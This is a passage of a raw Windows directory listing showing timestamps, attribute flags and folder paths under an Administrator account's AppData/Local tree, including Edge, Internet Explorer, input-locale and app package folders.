D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Safe Browsing 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Crashpad/reports 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Site Characteristics Database 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/js 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Code Cache/wasm 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Local Storage/leveldb 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/Default/Sync Data/LevelDB 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/ShaderCache/GPUCache 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Microsoft/Edge/User Data/SmartScreen/local 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/af-ZA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-AE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-BH 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-DZ 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-EG 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-IQ 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-JO 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-KW 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-LB 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-LY 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-MA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-OM 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-QA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-SA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-SY 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-TN 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ar-YE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/az-Latn-AZ 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/bg-BG 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/bn-BD 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ca-ES 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/cs-CZ 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/da-DK 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/de-AT 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/de-CH 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/de-DE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/de-LI 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/de-LU 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/el-GR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-029 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-AU 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-BZ 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-CA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-GB 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-HK 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-ID 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-IE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-IN 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-JM 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-MY 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-NZ 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-SG 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-TT 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-ZA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/en-ZW 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-419 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-AR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-BO 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-CL 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-CO 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-CR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-DO 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-EC 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-ES 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-GT 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-HN 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-MX 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-NI 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-PA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-PE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-PR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-PY 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-SV 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-US 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-UY 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/es-VE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/et-EE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/eu-ES 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fa-IR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fi-FI 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-029 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-BE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-CA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-CD 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-CH 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-CI 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-CM 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-FR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-HT 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-LU 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-MA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-MC 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-ML 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-RE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/fr-SN 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/gl-ES 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ha-Latn-NG 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/he-IL 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/hi-IN 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/hr-BA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/hr-HR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/hu-HU 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/hy-AM 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/id-ID 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/it-CH 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/it-IT 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ka-GE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/kk-KZ 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/lt-LT 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/lv-LV 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/mk-MK 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ms-BN 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ms-MY 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/nb-NO 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/nl-BE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/nl-NL 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/pl-PL 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/pt-BR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/pt-PT 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ro-MD 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ro-RO 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/ru-RU 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sk-SK 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sl-SI 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sq-AL 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sr-Cyrl-BA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sr-Cyrl-ME 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sr-Cyrl-RS 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sr-Latn-BA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sr-Latn-ME 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sr-Latn-RS 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sv-FI 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/sv-SE 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/tr-TR 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/uk-UA 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/input/uz-Latn-UZ 2021-05-08 08:20:24 D.... Administrator/AppData/Local/Microsoft/InputPersonalization/TrainedDataStore 2025-02-16 11:17:31 D.... Administrator/AppData/Local/Microsoft/Internet Explorer/CacheStorage 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Internet Explorer/IECompatData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Internet Explorer/TabRoaming 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Internet Explorer/Tracking Protection 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists 2025-02-16 10:59:25 D.... Administrator/AppData/Local/Microsoft/Media Player/Transcoded Files Cache 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Media Player/Sync Playlists/en-US/0000C052 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer/Desktop 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer/InPrivate 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/PlayReady/Internet Explorer/InPrivate/Desktop 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/Vault/4BF4C442-9B8A-41A0-B380-DD4A704DDB28 2025-02-16 10:52:01 D.... Administrator/AppData/Local/Microsoft/Windows/1033 2025-02-16 11:04:05 D.... Administrator/AppData/Local/Microsoft/Windows/ActionCenterCache 2025-02-16 10:48:48 DR... Administrator/AppData/Local/Microsoft/Windows/Application Shortcuts 2025-02-16 10:48:53 D.... Administrator/AppData/Local/Microsoft/Windows/Burn 2025-02-16 11:16:06 D.... Administrator/AppData/Local/Microsoft/Windows/Caches 2021-05-08 08:20:24 D.... Administrator/AppData/Local/Microsoft/Windows/CloudStore 2025-02-16 11:10:30 D.... Administrator/AppData/Local/Microsoft/Windows/Explorer 2025-02-16 10:55:59 D.... Administrator/AppData/Local/Microsoft/Windows/Fonts 2021-05-08 08:20:24 D.... Administrator/AppData/Local/Microsoft/Windows/GameExplorer 2025-02-16 11:18:05 D..S. Administrator/AppData/Local/Microsoft/Windows/History 2025-02-16 10:48:48 D.H.. Administrator/AppData/Local/Microsoft/Windows/IECompatCache 2025-02-16 10:48:48 D.H.. Administrator/AppData/Local/Microsoft/Windows/IECompatUaCache 2025-02-16 11:10:30 D.HS. Administrator/AppData/Local/Microsoft/Windows/INetCache 2025-02-16 10:59:25 D.HS. Administrator/AppData/Local/Microsoft/Windows/INetCookies 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/Windows/Notifications 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Windows/Ringtones 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Windows/RoamingTiles 2025-02-16 10:48:50 D.... Administrator/AppData/Local/Microsoft/Windows/Safety 2021-05-08 08:34:49 D.... Administrator/AppData/Local/Microsoft/Windows/Shell 2025-02-16 10:48:48 D.HS. Administrator/AppData/Local/Microsoft/Windows/WebCache 2021-05-08 08:20:24 D.... Administrator/AppData/Local/Microsoft/Windows/WinX 2025-02-16 10:48:53 DRH.. Administrator/AppData/Local/Microsoft/Windows/Burn/Burn 2025-02-16 11:04:05 D.... Administrator/AppData/Local/Microsoft/Windows/Explorer/NotifyIcon 2025-02-16 11:18:05 D.HS. Administrator/AppData/Local/Microsoft/Windows/History/History.IE5 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Windows/History/Low 2025-02-16 11:18:05 D.HS. Administrator/AppData/Local/Microsoft/Windows/History/History.IE5/MSHist012025021620250217 2025-02-16 10:48:48 D.H.. Administrator/AppData/Local/Microsoft/Windows/IECompatCache/Low 2025-02-16 10:48:48 D.H.. Administrator/AppData/Local/Microsoft/Windows/IECompatUaCache/Low 2025-02-16 10:59:45 D.HS. Administrator/AppData/Local/Microsoft/Windows/INetCache/IE 2025-02-16 11:10:30 D.... Administrator/AppData/Local/Microsoft/Windows/INetCache/Low 2025-02-16 11:10:30 D.H.. Administrator/AppData/Local/Microsoft/Windows/INetCache/Virtualized 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Windows/INetCookies/DNTException 2025-02-16 10:52:04 D.HS. Administrator/AppData/Local/Microsoft/Windows/INetCookies/ESE 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Windows/INetCookies/Low 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Microsoft/Windows/INetCookies/PrivacIE 2025-02-16 10:48:48 D.H.. Administrator/AppData/Local/Microsoft/Windows/INetCookies/DNTException/Low 2025-02-16 10:48:48 D.H.. Administrator/AppData/Local/Microsoft/Windows/INetCookies/PrivacIE/Low 2025-02-16 10:48:47 D.... Administrator/AppData/Local/Microsoft/Windows/Notifications/wpnidm 2025-02-16 10:48:50 D.... Administrator/AppData/Local/Microsoft/Windows/Safety/shell 2025-02-16 10:48:50 D.... Administrator/AppData/Local/Microsoft/Windows/Safety/shell/remote 2021-05-08 08:20:35 DR... Administrator/AppData/Local/Microsoft/Windows/WinX/Group1 2021-05-08 08:20:35 DR... Administrator/AppData/Local/Microsoft/Windows/WinX/Group2 2021-05-08 08:20:35 DR... Administrator/AppData/Local/Microsoft/Windows/WinX/Group3 2021-05-08 08:20:24 D.... Administrator/AppData/Local/Microsoft/Windows Sidebar/Gadgets 2025-02-16 10:49:01 D.... Administrator/AppData/Local/Microsoft_Corporation/ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj 2025-02-16 11:18:27 D.... Administrator/AppData/Local/Microsoft_Corporation/ServerManager.exe_StrongName_m3xk0k0ucj0oj3ai2hibnhnv4xobnimj/10.0.0.0 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AccountsControl_cw5n1h2txyewy 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.AsyncTextService_8wekyb3d8bbwe 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.BioEnrollment_cw5n1h2txyewy 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.CredDialogHost_cw5n1h2txyewy 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.ECApp_8wekyb3d8bbwe 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.LockApp_cw5n1h2txyewy 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.UI.Xaml.2.4_8wekyb3d8bbwe 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.VCLibs.140.00_8wekyb3d8bbwe 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/Microsoft.Win32WebViewHost_cw5n1h2txyewy 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Apprep.ChxApp_cw5n1h2txyewy 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CapturePicker_cw5n1h2txyewy 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkCaptivePortal_cw5n1h2txyewy 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.PinningConfirmationDialog_cw5n1h2txyewy 2025-02-16 10:48:50 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy 2025-02-16 11:11:01 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.SecHealthUI_cw5n1h2txyewy 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.ShellExperienceHost_cw5n1h2txyewy 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.Client.CBS_cw5n1h2txyewy 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.CBSPreview_cw5n1h2txyewy 2025-02-16 10:48:49 D.... Administrator/AppData/Local/Packages/windows.immersivecontrolpanel_cw5n1h2txyewy 2025-02-16 11:11:00 D.... Administrator/AppData/Local/Packages/Windows.PrintDialog_cw5n1h2txyewy 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AppData 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/LocalState 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/Settings 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/TempState 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AppData 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/LocalState 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/Settings 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/TempState 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AppData 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/LocalState 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/Settings 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/TempState 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:03 D.HS. Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:03 D.... Administrator/AppData/Local/Packages/E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy/AC/Temp 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/LocalCache 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/LocalState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/RoamingState 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/Settings 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/SystemAppData 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/TempState 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/INetCache 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/INetCookies 2025-02-16 11:11:02 D.HS. Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/INetHistory 2025-02-16 11:11:02 D.... Administrator/AppData/Local/Packages/F46D4000-FD22-4DB4-AC8E-4E1DDDE828FE_cw5n1h2txyewy/AC/Temp 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AC 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/AppData 2025-02-16 10:48:48 D.... Administrator/AppData/Local/Packages/Microsoft.AAD.BrokerPlugin_cw5n1h2txyewy/LocalCache 2025-02-16 10:48:48 D.... 